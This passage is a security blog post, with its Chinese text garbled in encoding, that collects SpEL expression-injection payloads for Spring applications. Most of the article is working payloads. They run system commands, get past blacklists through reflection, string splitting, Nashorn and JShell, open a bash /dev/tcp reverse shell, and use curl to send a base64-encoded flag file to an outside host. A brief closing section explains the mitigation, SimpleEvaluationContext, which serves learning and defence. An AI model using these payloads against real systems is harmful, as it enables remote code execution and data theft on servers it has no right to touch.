<h2 id="SpELå¯¼è‡´çš„ä»»æ„å‘½ä»¤æ‰§è¡Œ"><a href="#SpELå¯¼è‡´çš„ä»»æ„å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="SpELå¯¼è‡´çš„ä»»æ„å‘½ä»¤æ‰§è¡Œ"></a>SpELå¯¼è‡´çš„ä»»æ„å‘½ä»¤æ‰§è¡Œ</h2><h3 id="å¸¸ç”¨payload"><a href="#å¸¸ç”¨payload" class="headerlink" title="å¸¸ç”¨payload"></a>å¸¸ç”¨payload</h3><pre><code>T(java.lang.Runtime).getRuntime().exec(&quot;nslookup a.com&quot;)
T(Thread).sleep(10000)
#this.getClass().forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;nslookup a.com&#39;)
new java.lang.ProcessBuilder({&#39;nslookup a.com&#39;}).start()</code></pre><p>åˆ©ç”¨åå°„æ„é€ ç»•è¿‡é»‘åå•</p>
<pre><code>#{T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;curl fg5hme.ceye.io/`cat flag_j4v4_chun|base64|tr &#39;\n&#39; &#39;-&#39;`&quot;})}</code></pre><p>åˆ©ç”¨ScriptEngineManageræ„é€ ç»•è¿‡é»‘åå•</p>
<pre><code class="java">#{T(javax.script.ScriptEngineManager).newInstance()
    .getEngineByName(&quot;nashorn&quot;)
        .eval(&quot;s=[3];s[0]=&#39;/bin/bash&#39;;s[1]=&#39;-c&#39;;s[2]=&#39;ex&quot;+&quot;ec 5&lt;&gt;/dev/tcp/1.2.3.4/2333;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&#39;;java.la&quot;+&quot;ng.Run&quot;+&quot;time.getRu&quot;+&quot;ntime().ex&quot;+&quot;ec(s);&quot;)}</code></pre>
<pre><code>&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[15]
    .invoke(&#39;&#39;[&#39;class&#39;].forName(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[7]
        .invoke(null),&#39;curl 172.17.0.1:9898&#39;)</code></pre><p> é™¤æ­¤ä»¥å¤–å½“æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤è¢«è¿‡æ»¤æˆ–è€…è¢«URLç¼–ç æ‰æ—¶æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>String</code>ç±»åŠ¨æ€ç”Ÿæˆå­—ç¬¦<br>å¦‚è¦æ‰§è¡Œçš„å‘½ä»¤ä¸º<code>open /Applications/Calculator.app</code>æˆ‘ä»¬å¯ä»¥é‡‡ç”¨<code>new java.lang.String(new byte[]{,,...})</code>æˆ–è€…<code>concat(T(java.lang.Character).toString())</code>åµŒå¥—æ¥ç»•è¿‡ </p>
<pre><code>T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(&quot;jdk.jshell.JShell&quot;,true).Methods[6].invoke(null,{}).eval(&#39;whatever java code in one statement&#39;).toString()</code></pre><h3 id="ä¸€äº›æŠ€å·§"><a href="#ä¸€äº›æŠ€å·§" class="headerlink" title="ä¸€äº›æŠ€å·§"></a>ä¸€äº›æŠ€å·§</h3><h4 id="newè¢«è¿‡æ»¤"><a href="#newè¢«è¿‡æ»¤" class="headerlink" title="newè¢«è¿‡æ»¤"></a>newè¢«è¿‡æ»¤</h4><p>å¯ä»¥ç”¨NEW</p>
<h3 id="ä¸€äº›ç›¸å…³çš„ctfé¢˜ç›®"><a href="#ä¸€äº›ç›¸å…³çš„ctfé¢˜ç›®" class="headerlink" title="ä¸€äº›ç›¸å…³çš„ctfé¢˜ç›®"></a>ä¸€äº›ç›¸å…³çš„ctfé¢˜ç›®</h3><h4 id="de1ctf2020-cal"><a href="#de1ctf2020-cal" class="headerlink" title="de1ctf2020 cal"></a>de1ctf2020 cal</h4><h3 id="SpELæä¾›çš„ä¸¤ä¸ªEvaluationContextçš„åŒºåˆ«"><a href="#SpELæä¾›çš„ä¸¤ä¸ªEvaluationContextçš„åŒºåˆ«" class="headerlink" title="SpELæä¾›çš„ä¸¤ä¸ªEvaluationContextçš„åŒºåˆ«"></a>SpELæä¾›çš„ä¸¤ä¸ª<code>EvaluationContext</code>çš„åŒºåˆ«</h3><p>SpELæä¾›çš„ä¸¤ä¸ª<code>EvaluationContext</code>çš„åŒºåˆ«ã€‚<br>ï¼ˆEvaluationContextè¯„ä¼°è¡¨è¾¾å¼ä»¥è§£æå±æ€§ï¼Œæ–¹æ³•æˆ–å­—æ®µå¹¶å¸®åŠ©æ‰§è¡Œç±»å‹è½¬æ¢æ—¶ä½¿ç”¨è¯¥æ¥å£ã€‚æœ‰ä¸¤ä¸ªå¼€ç®±å³ç”¨çš„å®ç°ã€‚ï¼‰</p>
<ul>
<li>SimpleEvaluationContextâ€‰- é’ˆå¯¹ä¸éœ€è¦SpELè¯­è¨€è¯­æ³•çš„å…¨éƒ¨èŒƒå›´å¹¶ä¸”åº”è¯¥å—åˆ°æœ‰æ„é™åˆ¶çš„è¡¨è¾¾å¼ç±»åˆ«ï¼Œå…¬å¼€SpELè¯­è¨€ç‰¹æ€§å’Œé…ç½®é€‰é¡¹çš„å­é›†ã€‚</li>
<li>StandardEvaluationContextâ€‰- å…¬å¼€å…¨å¥—SpELè¯­è¨€åŠŸèƒ½å’Œé…ç½®é€‰é¡¹ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥æŒ‡å®šé»˜è®¤çš„æ ¹å¯¹è±¡å¹¶é…ç½®æ¯ä¸ªå¯ç”¨çš„è¯„ä¼°ç›¸å…³ç­–ç•¥ã€‚</li>
</ul>
<p><code>SimpleEvaluationContext</code>æ—¨åœ¨ä»…æ”¯æŒSpELè¯­è¨€è¯­æ³•çš„ä¸€ä¸ªå­é›†ã€‚å®ƒä¸åŒ…æ‹¬ Javaç±»å‹å¼•ç”¨ï¼Œæ„é€ å‡½æ•°å’Œbeanå¼•ç”¨ã€‚</p>
<p>æ‰€ä»¥è¯´æŒ‡å®šæ­£ç¡®<code>EvaluationContext</code>ï¼Œæ˜¯é˜²æ­¢SpElè¡¨è¾¾å¼æ³¨å…¥æ¼æ´äº§ç”Ÿçš„é¦–é€‰ï¼Œä¹‹å‰å‡ºç°è¿‡ç›¸å…³çš„SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼Œå…¶ä¿®å¤æ–¹å¼å°±æ˜¯ä½¿ç”¨<code>SimpleEvaluationContext</code>æ›¿ä»£<code>StandardEvaluationContext</code>ã€‚</p>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p> <a href="http://rui0.cn/archives/1043" target="_blank" rel="noopener">http://rui0.cn/archives/1043</a> </p>
<p> <a href="http://ifeve.com/spring-6-spel/" target="_blank" rel="noopener">http://ifeve.com/spring-6-spel/</a>  æ–‡æ¡£</p>
<p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/05/06/SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´/">http://blog.ccreater.top/2020/05/06/SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/05/06/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" data-id="cka3ckr22000iv4v0a3rqb815" data-title="SpELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">å­¦ä¹ ç¬”è®°</a></li></ul>

    </footer>
  </div>
  
</article>





  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&lt;- Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/3/">Next -&gt;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cveå¤ç°</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/">åšé¢˜ç¬”è®°</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82/">æ‚</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">æ¸—é€</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">æ¼æ´æŒ–æ˜</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B/">ç¼–ç¨‹</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA/">é¶åœº</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SpEL/" rel="tag">SpEL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cveå¤ç°</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/django/" rel="tag">django</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">å†…ç½‘æ¸—é€</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">å‡ºé¢˜ç¬”è®°</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">åŸŸæ¸—é€</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">å¤ç°</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">å­¦ä¹ ç¬”è®°</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">å°å·¥å…·</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">å·¥å…·</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">æ‚</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">æ¯”èµ›</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">æ¸—é€</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">æ¼æ´æŒ–æ˜</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">çº¿ä¸Šèµ›</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">ç¼–ç¨‹</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">è®°å½•</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">é¶åœº</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 12px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 16px;">cveå¤ç°</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/java/" style="font-size: 12px;">java</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16px;">web</a> <a href="/tags/wp/" style="font-size: 18px;">wp</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">å†…ç½‘æ¸—é€</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">å‡ºé¢˜ç¬”è®°</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 12px;">åŸŸæ¸—é€</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">å¤ç°</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">å­¦ä¹ ç¬”è®°</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 14px;">å°å·¥å…·</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">å·¥å…·</a> <a href="/tags/%E6%9D%82/" style="font-size: 12px;">æ‚</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">æ¯”èµ›</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">æ¸—é€</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">æ¼æ´æŒ–æ˜</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">çº¿ä¸Šèµ›</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 12px;">ç¼–ç¨‹</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">è®°å½•</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">é¶åœº</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/10/05/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/">FastJson1.2.24è°ƒè¯•è®°å½•_å¤ç°</a>
          </li>
        
          <li>
            <a href="/2020/10/04/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/">2020 ciscn åä¸œå— web</a>
          </li>
        
          <li>
            <a href="/2020/10/04/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/">jdk7u21ååºåˆ—åŒ–å¤ç°</a>
          </li>
        
          <li>
            <a href="/2020/09/21/2020-QWB-final-bjyadmin/">2020-QWB-final-bjyadmin</a>
          </li>
        
          <li>
            <a href="/2020/09/14/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/">ç¾ŠåŸæ¯2020</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 ccreater<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":100},"mobile":{"show":true},"react":{"opacity":0.7},"dialog":{"enable":true,"hitokoto":true},"log":false});</script></body>
</html>